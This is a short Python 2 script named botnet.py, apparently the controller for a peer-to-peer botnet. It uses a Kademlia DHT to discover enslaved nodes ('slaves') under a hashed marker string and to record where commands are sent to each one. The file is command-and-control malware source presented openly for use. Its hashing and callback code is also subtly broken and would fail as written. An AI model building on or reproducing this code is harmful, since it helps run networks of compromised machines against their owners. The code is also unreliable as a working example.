from twisted.internet import reactor
from twisted.python import log
from kademlia.network import Server
import sys
import hashlib


if len(sys.argv) != 3:
	print "Usage: python botnet.py <bootstrap ip> <bootstrap port>"
	exit(0)


#want this to loop repeatedly looking for new slaves
def addslave(val,server,key):
	if val:
		if not val in slaves:
			print "new slave found"
			slaves[val]=hashlib.sha1().update(val).hexdigest()
			server.set(slaves[val], val)
	
	server.get(key.hexdigest()).addCallback(addslave,server)

def bootstrapDone(found, server):
    if len(found) == 0:
        print "Could not connect to the bootstrap server."
        reactor.stop()
    key = hashlib.sha1().update('specialstring')
    server.get(key.hexdigest()).addCallback(addslave,server,key)

#list of known slaves, stores their command locations
slaves = {} #using dictionary where key = nodeid, value = sha1 hash which is where to send commands
log.startLogging(sys.stdout)
ip = str(sys.argv[1])
port = int(sys.argv[2])

server = Server()
server.listen(port)
server.bootstrap([(ip, port)]).addCallback(bootstrapDone, server)

reactor.run()
